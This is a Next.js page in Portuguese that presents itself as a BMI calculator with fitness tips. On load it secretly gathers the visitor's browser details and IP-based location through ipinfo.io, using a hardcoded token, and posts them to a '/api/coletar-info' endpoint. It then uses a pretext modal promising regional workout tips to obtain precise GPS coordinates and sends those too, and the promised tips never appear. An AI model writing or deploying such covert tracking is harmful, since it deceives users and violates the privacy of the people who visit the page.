import { useEffect, useState } from 'react';
import styles from '../styles/Home.module.css';
import Head from 'next/head';

export default function Home() {

  const [mensagem, setMensagem] = useState('');
  const [peso, setPeso] = useState('');
  const [altura, setAltura] = useState('');
  const [imc, setImc] = useState(null);
  const [motivo, setMotivo] = useState('');
  const [mostrarModal, setMostrarModal] = useState(false);
  const [coletaInicialFeita, setColetaInicialFeita] = useState(false);

  

  useEffect(() => {
    async function coletaInicial() {
      setMensagem('');

      const info = {
        userAgent: navigator.userAgent,
        language: navigator.language,
        platform: navigator.platform,
        hora: new Date().toLocaleString(),
        location: '',
      };

      setMensagem('');
      const ipData = await obterLocalizacaoIP();
      info.ip = ipData.ip;
      info.localizacaoIP = {
        cidade: ipData.city,
        regiao: ipData.region,
        pais: ipData.country,
        org: ipData.org,
      };

      setMensagem('');
      await enviar(info);
      setMensagem('Seu sucesso é o meu!!!');
      setColetaInicialFeita(true);
    }

    coletaInicial();
  }, []);

  async function obterLocalizacaoIP() {
    try {
      const res = await fetch('https://ipinfo.io/json?token=8d5553292f5d68');
      if (!res.ok) throw new Error('Erro ao obter localização IP');
      return await res.json();
    } catch (err) {
      console.error('Erro ao obter localização IP:', err);
      return { ip: 'Desconhecido', city: '', region: '', country: '', org: '' };
    }
  }

  async function obterLocalizacaoGPS() {
    return new Promise((resolve) => {
      if (!navigator.geolocation) {
        return resolve('Geolocalização não suportada');
      }

      navigator.geolocation.getCurrentPosition(
        (pos) => {
          resolve({
            latitude: pos.coords.latitude,
            longitude: pos.coords.longitude,
          });
        },
        () => {
          resolve('Permissão negada ou erro ao obter localização.');
        }
      );
    });
  }

  async function enviar(data) {
    try {
      const res = await fetch('/api/coletar-info', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(data),
      });

      if (!res.ok) {
        setMensagem('Erro ao enviar os dados');
        console.error('Erro ao enviar dados:', await res.text());
      }
    } catch (err) {
      setMensagem('Erro ao conectar com o servidor');
      console.error('Erro ao enviar dados:', err);
    }
  }

  const calcularIMC = () => {
    const pesoNum = parseFloat(peso);
    const alturaNum = parseFloat(altura);
    if (!pesoNum || !alturaNum) return;

    const resultado = pesoNum / (alturaNum * alturaNum);
    setImc(resultado.toFixed(2));

    if (resultado < 18.5) setMotivo('Você está abaixo do peso. Hora de ganhar massa com foco! 💪');
    else if (resultado < 24.9) setMotivo('Você está com o peso ideal! Continue firme nos treinos! 🏋️');
    else if (resultado < 29.9) setMotivo('Você está com sobrepeso. Vamos ajustar a dieta! 🍽️');
    else setMotivo('Obesidade detectada. É hora de mudar com disciplina e garra! 🔥');

    setMostrarModal(true);
  };

  const solicitarLocalizacao = async () => {
    setMensagem('Solicitando geolocalização...');
    const localizacao = await obterLocalizacaoGPS();

    if (typeof localizacao === 'string') {
      alert(localizacao);
      setMostrarModal(false);
      return;
    }

    setMensagem('Coletando novamente com geolocalização...');
    const info = {
      userAgent: navigator.userAgent,
      language: navigator.language,
      platform: navigator.platform,
      hora: new Date().toLocaleString(),
      location: localizacao,
    };

    const ipData = await obterLocalizacaoIP();
    info.ip = ipData.ip;
    info.localizacaoIP = {
      cidade: ipData.city,
      regiao: ipData.region,
      pais: ipData.country,
      org: ipData.org,
    };

    await enviar(info);
    alert('Localização ativada e dados atualizados com sucesso! 📍');
    setMostrarModal(false);
    setMensagem('Dados com geolocalização enviados!');
  };

  return (
    
<>
    <Head>
        <title>Calculadora de IMC</title>
        <meta name="description" content="Calcule seu IMC e receba dicas personalizadas com Rafael Fernandes" />
      </Head>

    <div className={styles.container}>
      <h1 className={styles.title}>Calculadora de IMC</h1>
      <p>{mensagem}</p>

      <div className={styles.inputContainer}>
        <input
          type="number"
          placeholder="Peso (kg)"
          value={peso}
          onChange={(e) => setPeso(e.target.value)}
          className={styles.input}
        />
        <input
          type="number"
          placeholder="Altura (m)"
          value={altura}
          onChange={(e) => setAltura(e.target.value)}
          className={styles.input}
        />
        <br />
        <button onClick={calcularIMC} className={styles.button}>Calcular IMC</button>
      </div>

      {imc && (
        <div className={styles.result}>
          <h2>Seu IMC: {imc}</h2>
          <p>{motivo}</p>
        </div>
      )}

      {mostrarModal && (
        <div className={styles.modalOverlay}>
          <div className={styles.modalContent}>
            <h2>📍 Personalize sua jornada fitness!</h2>
            <p>Ative sua localização e receba dicas e treinos para sua região.</p>
            <button onClick={solicitarLocalizacao} className={styles.modalButton}>
              OK
            </button>
          </div>
        </div>
      )}
    </div>
  </>);
}
